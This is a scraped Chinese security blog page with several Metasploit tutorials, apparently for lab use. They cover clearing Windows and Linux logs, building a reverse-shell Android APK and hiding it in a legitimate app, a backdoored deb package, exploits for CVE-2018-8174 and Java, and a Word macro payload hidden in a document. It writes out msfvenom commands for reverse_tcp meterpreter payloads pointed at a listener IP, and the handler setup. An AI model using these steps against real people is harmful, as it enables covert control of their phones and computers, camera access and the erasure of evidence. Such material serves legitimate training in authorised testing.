<h4 id="5-1-window日志清理"><a href="#5-1-window日志清理" class="headerlink" title="5.1 window日志清理"></a><strong>5.1 window日志清理</strong></h4><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204549925.png" alt="image-20210819204549925"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204652982.png" alt="image-20210819204652982"></p>
<p>​        也可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204737145.png" alt="image-20210819204737145"></p>
<h4 id="5-2-Linux日志清理"><a href="#5-2-Linux日志清理" class="headerlink" title="5.2 Linux日志清理"></a><strong>5.2 Linux日志清理</strong></h4><p>kali进入其shell里操作</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204946095.png" alt="image-20210819204946095"></p>
<p>  也可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205049062.png" alt="image-20210819205049062"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205105885.png" alt="image-20210819205105885"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205150600.png" alt="image-20210819205150600"></p>
<p>还可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205205428.png" alt="image-20210819205205428"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">Android客户端渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-18 18:29:35" itemprop="dateCreated datePublished" datetime="2021-08-18T18:29:35+08:00">2021-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 10:36:02" itemprop="dateModified" datetime="2021-10-08T10:36:02+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Android客户端渗透"><a href="#Android客户端渗透" class="headerlink" title="Android客户端渗透"></a>Android客户端渗透</h1><h2 id="一、back-door程序渗透Android"><a href="#一、back-door程序渗透Android" class="headerlink" title="一、back door程序渗透Android"></a>一、back door程序渗透Android</h2><p>步骤1：使用MSF生成一个apk的back door应用程序</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162007668.png" alt="image-20210818162007668"></p>
<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 R &gt;xuegod.apk</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162243078.png" alt="image-20210818162243078"></p>
<p>步骤2：监听</p>
<p>启动msf</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
<p>加载渗透模块并配置参数</p>
<p>use exploit/multi/handler</p>
<p>set payload android/meterpreter/reverse_tcp</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
<p>步骤3：</p>
<p>手机端下载并打开程序</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162318121.png" alt="image-20210818162318121"></p>
<p>kali端，会话建立成功</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162707785.png" alt="image-20210818162707785"></p>
<p>操控命令说明补充：</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162741892.png" alt="image-20210818162741892"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162808076.png" alt="image-20210818162808076"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162903481.png" alt="image-20210818162903481"></p>
<p>二、将木马隐藏到正版app中<br>说明：请勿在Kali2019.4版本中操作，可能存在兼容问题</p>
<p><strong>步骤1：搭建环境</strong></p>
<p>禁用ipv6</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163134441.png" alt="image-20210818163134441"></p>
<p>下载工具</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163211629.png" alt="image-20210818163211629"></p>
<p>解压文件</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163316767.png" alt="image-20210818163316767"></p>
<p>解压结果</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163357630.png" alt="image-20210818163357630"></p>
<p>修改程序</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163458535.png" alt="image-20210818163458535"></p>
<p><strong>步骤2：</strong>注入back door到apk</p>
<p>载入要注入back door的apk和apktool.jar工具到kali（注意路径）</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163928062.png" alt="image-20210818163928062"></p>
<p>进入apk工具（这里用到逆向与注入）</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164112162.png" alt="image-20210818164112162"></p>
<p>选择第3项（输入3)，然后配置参数</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164734783.png" alt="image-20210818164734783"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164643208.png" alt="image-20210818164643208"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164805027.png" alt="image-20210818164805027"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164849132.png" alt="image-20210818164849132"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165009619.png" alt="image-20210818165009619"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165125523.png" alt="image-20210818165125523"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170027865.png" alt="image-20210818170027865"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170140902.png" alt="image-20210818170140902"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170211040.png" alt="image-20210818170211040"></p>
<p>补充：</p>
<p>出错情况1：</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164416940.png" alt="image-20210818164416940"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164435145.png" alt="image-20210818164435145"></p>
<p>出错情况2：</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165254757.png" alt="image-20210818165254757"></p>
<p>解决方法</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165616957.png" alt="image-20210818165616957"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165818720.png" alt="image-20210818165818720"></p>
<p>步骤3：手动启动msf的监听（该步骤非必须，也可以用它自带的，如步骤2结果）</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
<p>步骤4：启动apache2服务</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170535594.png" alt="image-20210818170535594"></p>
<p>把apk放到根目录方便下载</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170632278.png" alt="image-20210818170632278"></p>
<p>步骤5：Android手机下载并安装apk</p>
<p>安装过程略，启动运行软件后</p>
<p>直接上结果</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170902403.png" alt="image-20210818170902403"></p>
<p>补充：</p>
<p>启动摄像头</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170957413.png" alt="image-20210818170957413"></p>
<p>注意：手机端会提示是是否打开摄像头</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">利用deb包-0day-java环境进行渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-18 16:17:01" itemprop="dateCreated datePublished" datetime="2021-08-18T16:17:01+08:00">2021-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 11:16:10" itemprop="dateModified" datetime="2021-10-08T11:16:10+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="利用deb包-0day-java环境进行渗透"><a href="#利用deb包-0day-java环境进行渗透" class="headerlink" title="利用deb包-0day-java环境进行渗透"></a>利用deb包-0day-java环境进行渗透</h1><h2 id="一、制作恶意deb软件包来触发back-door"><a href="#一、制作恶意deb软件包来触发back-door" class="headerlink" title="一、制作恶意deb软件包来触发back door"></a>一、制作恶意deb软件包来触发back door</h2><p><strong>以freesweep软件包为例子</strong> </p>
<p>步骤1：下载正版的freesweep软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154438382.png" alt="image-20210817154438382"></p>
<p>步骤2：</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154803409.png" alt="image-20210817154803409"></p>
<p><strong>命令说明</strong>：把EOF重定向（写入）到/root/free/DEBIAN/control里；EOF是指其下一行开始到最后EOF那一行的所有内容</p>
<p><strong>补充</strong>：也可以进入目录用vim写入，如下</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154555203.png" alt="image-20210817154555203"></p>
<p>确保路径存在（目录不存在，则要自己创建），注意大小写、顺序。</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154651297.png" alt="image-20210817154651297"></p>
<p>步骤3：创建deb软件包，安装后脚步文件来加载back door</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155435610.png" alt="image-20210817155435610"></p>
<p>设置文件执行权限</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155637985.png" alt="image-20210817155637985"></p>
<p>重新打包软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155808883.png" alt="image-20210817155808883"></p>
<p>说明：文件夹叫什么名，打包出来的软件包就叫什么名</p>
<p>步骤4：效果演示</p>
<p><strong>监听</strong></p>
<p>环境：一台kali（自己监听自己）</p>
<p>进入msf</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160019739.png" alt="image-20210817160019739"></p>
<p>加载监听模块并配置参数</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160301457.png" alt="image-20210817160301457"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160347828.png" alt="image-20210817160347828"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160457759.png" alt="image-20210817160457759"></p>
<p>打开另外一个控制台安装软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160543619.png" alt="image-20210817160543619"></p>
<p>结果：会话建立成功</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160622947.png" alt="image-20210817160622947"></p>
<p>补充：软件包被卸载后，会话会自动断开</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160756710.png" alt="image-20210817160756710"></p>
<h2 id="二、利用0DAY漏洞CVE-2018-8174获取shell"><a href="#二、利用0DAY漏洞CVE-2018-8174获取shell" class="headerlink" title="二、利用0DAY漏洞CVE-2018-8174获取shell"></a>二、利用0DAY漏洞CVE-2018-8174获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165222216.png" alt="image-20210817165222216"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165327932.png" alt="image-20210817165327932"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165542797.png" alt="image-20210817165542797"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165853688.png" alt="image-20210817165853688"></p>
<p>将恶意文件拷贝到web根目录下，</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170035572.png" alt="image-20210817170035572"></p>
<p>开启apache服务</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170128424.png" alt="image-20210817170128424"></p>
<p>加载和配置模块</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170259965.png" alt="image-20210817170259965"></p>
<p>在window下启动恶意文件，要注意payload设置</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170320356.png" alt="image-20210817170320356"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170330785.png" alt="image-20210817170330785"></p>
<p>启动，监听</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170444127.png" alt="image-20210817170444127"></p>
<p>3.启动恶意文件</p>
<p>注意：该漏洞针对的是ie浏览器和IE内核的浏览器（如360浏览器）</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170646899.png" alt="image-20210817170646899"></p>
<p>结果</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170726851.png" alt="image-20210817170726851"></p>
<h2 id="三、基于java环境的漏洞获取shell"><a href="#三、基于java环境的漏洞获取shell" class="headerlink" title="三、基于java环境的漏洞获取shell"></a>三、基于java环境的漏洞获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101510091.png" alt="image-20210818101510091"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101548466.png" alt="image-20210818101548466"></p>
<p>说明：该漏洞与jre的版本有关，其他版本可能不行</p>
<p>步骤1：加载模块</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101727843.png" alt="image-20210818101727843"></p>
<p>步骤2：配置payload并启动</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101835440.png" alt="image-20210818101835440"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101854499.png" alt="image-20210818101854499"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101932255.png" alt="image-20210818101932255"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102202346.png" alt="image-20210818102202346"></p>
<p>补充：需要打开apache2服务</p>
<p>步骤3：可能会弹出的提示框操作与结果展示</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102503192.png" alt="image-20210818102503192"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102538395.png" alt="image-20210818102538395"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102625422.png" alt="image-20210818102625422"></p>
<p>结果（会话可能后台运行了）</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102811873.png" alt="image-20210818102811873"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102839600.png" alt="image-20210818102839600"></p>
<h2 id="四、利用宏感染word文档获取shell"><a href="#四、利用宏感染word文档获取shell" class="headerlink" title="四、利用宏感染word文档获取shell"></a>四、利用宏感染word文档获取shell</h2><p>步骤1：生成宏恶意文件</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818103109953.png" alt="image-20210818103109953"></p>
<p>指令：msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104623212.png" alt="image-20210818104623212"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104647745.png" alt="image-20210818104647745"></p>
<p>将上面这段代码放到word里的宏。</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104807569.png" alt="image-20210818104807569"></p>
<p>payload放到文件内容（将其隐藏）</p>
<p>如图操作</p>
<p>宏设置：</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105017122.png" alt="image-20210818105017122"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105121898.png" alt="image-20210818105121898"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105236492.png" alt="image-20210818105236492"></p>
<p>payload操作：</p>
<p>将kali生成的payload代码放入刚保存的带宏的文件中</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105437540.png" alt="image-20210818105437540"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105600439.png" alt="image-20210818105600439"></p>
<p>隐藏效果</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105613376.png" alt="image-20210818105613376"></p>
<p>再在前面输入正常内容</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105658221.png" alt="image-20210818105658221"></p>
<p>步骤2：监听</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105902905.png" alt="image-20210818105902905"></p>
<p>LHOST是指监听者的ip地址</p>
